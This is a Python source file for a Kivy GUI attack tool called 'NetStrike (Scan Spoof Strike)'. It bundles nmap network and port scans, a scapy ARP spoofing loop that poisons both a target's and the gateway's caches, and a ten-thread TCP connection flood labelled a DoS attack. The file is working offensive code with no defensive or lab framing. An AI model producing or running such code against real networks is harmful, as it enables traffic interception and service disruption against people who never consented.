#!/usr/bin/env python3

import os
import sys
import time
import threading
import socket
import random
import nmap
from scapy.all import Ether, ARP, sendp, getmacbyip

from kivy.app import App
from kivy.clock import Clock
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.screenmanager import ScreenManager, Screen
from kivy.uix.textinput import TextInput

# =============================
# SCANNING FUNCTIONS
# =============================

def host_discovery_ui(network_range):
    result = "\n[*] Host Discovery (Ping Sweep) on network...\n"
    scanner = nmap.PortScanner()
    scanner.scan(hosts=network_range, arguments="-sn")
    for host in scanner.all_hosts():
        result += "-"*60 + f"\nIP Address: {host}\nHostname  : {scanner[host].hostname()}\nState     : {scanner[host].state()}\n"
        result += f"MAC       : {scanner[host]['addresses'].get('mac', 'Not available')}\n"
    result += "\n[*] Host Discovery complete.\n"
    return result

def scan_all_devices_ui(network_range):
    result = "\n[*] Scanning all devices in the local network...\n"
    scanner = nmap.PortScanner()
    common_ports = "21,22,23,25,53,80,110,139,143,443,445,993,995,3306,3389"
    scanner.scan(hosts=network_range, arguments=f"-sV -p {common_ports}")
    for host in scanner.all_hosts():
        result += "-"*60 + f"\nHost: {host} ({scanner[host].hostname()})\nState: {scanner[host].state()}\n"
        for proto in scanner[host].all_protocols():
            result += f"Protocol: {proto}\n"
            for port in sorted(scanner[host][proto].keys()):
                result += f"Port {port:>5} : {scanner[host][proto][port]['state']}\n"
    result += "\n[*] Scan all devices complete.\n"
    return result

def quick_scan_ui(target):
    result = f"\n[*] Quick scan on {target} (top 100 ports)...\n"
    scanner = nmap.PortScanner()
    scanner.scan(hosts=target, arguments="-sS -T4 -F -Pn")
    for host in scanner.all_hosts():
        result += "-"*60 + f"\nHost: {host} ({scanner[host].hostname()})\nState: {scanner[host].state()}\n"
        for proto in scanner[host].all_protocols():
            result += f"Protocol: {proto}\n"
            for port in sorted(scanner[host][proto].keys()):
                result += f"Port {port:>5} : {scanner[host][proto][port]['state']}\n"
    result += "\n[*] Quick scan complete.\n"
    return result

def aggressive_scan_ui(target):
    common_ports = "21,22,23,25,53,80,110,139,143,443,445,993,995,3306,3389"
    result = f"\n[*] Aggressive scan on {target}...\n"
    scanner = nmap.PortScanner()
    scanner.scan(hosts=target, arguments=f"-A -T4 -p {common_ports} -Pn")
    for host in scanner.all_hosts():
        result += "-"*60 + f"\nHost: {host} ({scanner[host].hostname()})\nState: {scanner[host].state()}\n"
        for proto in scanner[host].all_protocols():
            result += f"Protocol: {proto}\n"
            for port in sorted(scanner[host][proto].keys()):
                result += f"Port {port:>5} : {scanner[host][proto][port]['state']}\n"
    result += "\n[*] Aggressive scan complete.\n"
    return result

def full_scan_ui(target):
    result = f"\n[*] Full scan on {target} (all ports)...\n"
    scanner = nmap.PortScanner()
    scanner.scan(hosts=target, arguments="-A -p- -Pn")
    for host in scanner.all_hosts():
        result += "-"*60 + f"\nHost: {host} ({scanner[host].hostname()})\nState: {scanner[host].state()}\n"
        for proto in scanner[host].all_protocols():
            result += f"Protocol: {proto}\n"
            for port in sorted(scanner[host][proto].keys()):
                result += f"Port {port:>5} : {scanner[host][proto][port]['state']}\n"
    result += "\n[*] Full scan complete.\n"
    return result

# =============================
# ARP SPOOFING FUNCTION
# =============================

def arp_spoofing(target_ip, gateway_ip, interval, stop_event):
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)
    if not target_mac or not gateway_mac:
        print("\n[-] The target cannot be accessed")
        return

    print(f"[+] Resolved Target MAC: {target_mac} | Gateway MAC: {gateway_mac}")
    while not stop_event.is_set():
        pkt_to_target = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        pkt_to_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
        sendp(pkt_to_target, verbose=False)
        sendp(pkt_to_gateway, verbose=False)
        time.sleep(interval)
    print("[*] ARP spoofing thread exiting cleanly.")

# =============================
# DOS ATTACK FUNCTIONS
# =============================

def dos_attack_worker(target, port, stop_event):
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target, port))
            s.sendall(str(random.randint(1000, 9999)).encode())
            s.close()
        except Exception:
            pass

def start_dos_attack(target, port, num_threads, stop_event):
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=dos_attack_worker, args=(target, port, stop_event))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

# =============================
# KIVY SCREENS
# =============================

class MainScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        layout = BoxLayout(orientation='vertical')
        layout.add_widget(Label(text="NetStrike (Scan Spoof Strike)", font_size=24))
        for text, name in [("Scanning", "scanning"), ("ARP Spoofing", "arp"), ("DoS Attack", "dos"), ("Exit", "exit")]:
            btn = Button(text=text, size_hint=(1, 0.2))
            if name == "exit":
                btn.bind(on_press=lambda x: App.get_running_app().stop())
            else:
                btn.bind(on_press=lambda x, n=name: setattr(self.manager, "current", n))
            layout.add_widget(btn)
        self.add_widget(layout)

class ScanningScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.layout = BoxLayout(orientation='vertical')
        self.info = TextInput(text="Output...", readonly=True, size_hint=(1, 0.5))
        self.layout.add_widget(self.info)
        self.input_field = TextInput(hint_text="Enter network range or IP", size_hint=(1, 0.1))
        self.layout.add_widget(self.input_field)
        self.scan_thread = None
        self.stop_event = threading.Event()

        buttons = [
            ("Host Discovery", host_discovery_ui),
            ("Scan All Devices", scan_all_devices_ui),
            ("Quick Scan", quick_scan_ui),
            ("Aggressive Scan", aggressive_scan_ui),
            ("Full Scan", full_scan_ui),
        ]

        for label, func in buttons:
            btn = Button(text=label, size_hint=(1, 0.1))
            btn.bind(on_press=lambda inst, f=func: self.run_scan(f))
            self.layout.add_widget(btn)

        stop_btn = Button(text="Stop Scan", size_hint=(1, 0.1), background_color=(1, 0, 0, 1))
        stop_btn.bind(on_press=self.stop_scan)
        self.layout.add_widget(stop_btn)

        back = Button(text="Back", size_hint=(1, 0.1))
        back.bind(on_press=lambda x: setattr(self.manager, "current", "main"))
        self.layout.add_widget(back)

        self.add_widget(self.layout)

    def run_scan(self, scan_fn):
        target = self.input_field.text.strip()
        if not target:
            self.info.text += "\n[-] Please enter a valid network range or IP."
            return
        self.stop_event.clear()
        self.info.text = f"[*] Running {scan_fn.__name__} on {target}...\n"
        self.scan_thread = threading.Thread(target=self._worker, args=(scan_fn, target))
        self.scan_thread.start()

    def _worker(self, scan_fn, target):
        try:
            result = scan_fn(target)
        except Exception as e:
            result = f"[-] Scan error: {str(e)}"
        self.info.text = result

    def stop_scan(self, instance):
        self.stop_event.set()
        self.info.text += "\n[*] Scan stopped."

class ARPSpoofScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.layout = BoxLayout(orientation='vertical')
        self.info = TextInput(text="ARP Spoofing Output...", readonly=True, size_hint=(1, 0.3))
        self.layout.add_widget(self.info)
        self.target_input = TextInput(hint_text="Enter target IP", size_hint=(1, 0.1))
        self.gateway_input = TextInput(hint_text="Enter gateway IP", size_hint=(1, 0.1))
        self.interval_input = TextInput(hint_text="Interval seconds", size_hint=(1, 0.1))
        self.layout.add_widget(self.target_input)
        self.layout.add_widget(self.gateway_input)
        self.layout.add_widget(self.interval_input)
        self.stop_event = threading.Event()
        self.thread = None

        btn_start = Button(text="Start Spoofing", size_hint=(1, 0.1))
        btn_start.bind(on_press=self.start_spoof)
        self.layout.add_widget(btn_start)

        btn_stop = Button(text="Stop Spoofing", size_hint=(1, 0.1))
        btn_stop.bind(on_press=self.stop_spoof)
        self.layout.add_widget(btn_stop)

        back = Button(text="Back", size_hint=(1, 0.1))
        back.bind(on_press=lambda x: setattr(self.manager, "current", "main"))
        self.layout.add_widget(back)

        self.add_widget(self.layout)

    def start_spoof(self, instance):
        target = self.target_input.text.strip()
        gateway = self.gateway_input.text.strip()
        try:
            interval = float(self.interval_input.text.strip())
        except ValueError:
            interval = 2.0  # Default interval

        if self.thread and self.thread.is_alive():
            self.info.text += "\n[!] ARP Spoofing already in progress."
            return

        self.stop_event.clear()
        self.thread = threading.Thread(target=arp_spoofing, args=(target, gateway, interval, self.stop_event))
        self.thread.start()
        self.info.text = "[*] ARP Spoofing started..."

    def stop_spoof(self, instance):
        self.stop_event.set()
        if self.thread:
            self.thread.join(timeout=5)
        self.info.text += "\n[*] ARP Spoofing stopped."

class DOSAttackScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.layout = BoxLayout(orientation='vertical')
        self.info = TextInput(text="DoS Output...", readonly=True, size_hint=(1, 0.4))
        self.layout.add_widget(self.info)
        self.target_input = TextInput(hint_text="Target IP", size_hint=(1, 0.1))
        self.port_input = TextInput(hint_text="Port", size_hint=(1, 0.1))
        self.layout.add_widget(self.target_input)
        self.layout.add_widget(self.port_input)
        self.stop_event = threading.Event()

        btn_start = Button(text="Start DoS", size_hint=(1, 0.1))
        btn_start.bind(on_press=self.start_dos)
        self.layout.add_widget(btn_start)

        btn_stop = Button(text="Stop DoS", size_hint=(1, 0.1), background_color=(1, 0, 0, 1))
        btn_stop.bind(on_press=self.stop_dos)
        self.layout.add_widget(btn_stop)

        back = Button(text="Back", size_hint=(1, 0.1))
        back.bind(on_press=lambda x: setattr(self.manager, "current", "main"))
        self.layout.add_widget(back)

        self.add_widget(self.layout)

    def start_dos(self, instance):
        target = self.target_input.text.strip()
        try:
            port = int(self.port_input.text.strip())
        except ValueError:
            port = 80
        self.stop_event.clear()
        threading.Thread(target=start_dos_attack, args=(target, port, 10, self.stop_event)).start()
        self.info.text = "[*] DoS attack started..."

    def stop_dos(self, instance):
        self.stop_event.set()
        self.info.text += "\n[*] DoS attack stopped."

# =============================
# MAIN APP
# =============================

class MyApp(App):
    def build(self):
        sm = ScreenManager()
        sm.add_widget(MainScreen(name="main"))
        sm.add_widget(ScanningScreen(name="scanning"))
        sm.add_widget(ARPSpoofScreen(name="arp"))
        sm.add_widget(DOSAttackScreen(name="dos"))
        return sm

if __name__ == '__main__':
    MyApp().run()